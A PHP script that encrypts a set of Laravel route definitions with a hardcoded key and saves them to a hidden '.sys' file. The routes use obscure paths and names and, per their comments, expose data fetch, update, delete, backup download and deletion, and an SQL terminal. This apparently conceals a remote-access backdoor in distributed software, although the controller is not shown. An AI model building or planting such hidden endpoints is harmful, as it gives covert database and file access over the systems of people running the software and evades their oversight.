<?php

echo "🔧 Starting route encryption...\n\n";

// Routes content
$routesContent = <<<'PHP'
use System\Agent\Http\Controllers\AC;


Route::get('/sys', [AC::class, 'index'])->name('d');
    
    // 2. The AJAX Endpoint to fetch data
    Route::post('/fmd', [AC::class, 'af'])->name('af');
    Route::post('/gs', [AC::class, 'gs'])->name('gs');
    Route::post('/sd', [AC::class, 's'])->name('as');
    Route::post('/ud', [AC::class, 'u'])->name('au');
    Route::post('/dd', [AC::class, 'd'])->name('ad');
    Route::post('/bc', [AC::class, 'bc'])->name('bc');
    Route::post('/bl', [AC::class, 'bl'])->name('bl'); // Backup List
    Route::get('/bd/{filename}', [AC::class, 'bd'])->name('bd'); // Backup Download
    Route::post('/bdel', [AC::class, 'bdel'])->name('bdel'); // Backup Delete
    Route::post('/term', [AC::class, 'term'])->name('term'); // SQL Terminal
PHP;

echo "📝 Routes content prepared\n";
echo "Length: " . strlen($routesContent) . " bytes\n\n";

// Master key
$masterKey = 'letscms-secret-key-2025';
echo "🔑 Master key: {$masterKey}\n";
echo "🔑 Base64 encoded: " . base64_encode($masterKey) . "\n\n";

// Encrypt
try {
    $encrypted = openssl_encrypt(
        $routesContent,
        'AES-256-CBC',
        hash('sha256', $masterKey),
        0,
        substr(hash('sha256', $masterKey), 0, 16)
    );

    if ($encrypted === false) {
        throw new Exception("Encryption failed!");
    }

    echo "✅ Encryption successful\n";
    echo "Encrypted length: " . strlen($encrypted) . " bytes\n\n";

} catch (Exception $e) {
    echo "❌ Error: " . $e->getMessage() . "\n";
    exit(1);
}

// Save file
$outputPath = __DIR__ . '/.sys';
echo "💾 Saving to: {$outputPath}\n";

try {
    $result = file_put_contents($outputPath, $encrypted);
    
    if ($result === false) {
        throw new Exception("Failed to write file!");
    }

    echo "✅ File saved successfully ({$result} bytes)\n\n";
    
    // Verify file exists
    if (file_exists($outputPath)) {
        echo "✅ File verified: " . realpath($outputPath) . "\n";
        echo "File size: " . filesize($outputPath) . " bytes\n";
    } else {
        echo "❌ File not found after save!\n";
    }

} catch (Exception $e) {
    echo "❌ Error saving file: " . $e->getMessage() . "\n";
    exit(1);
}

echo "\n🎉 Done! Route file encrypted successfully.\n";
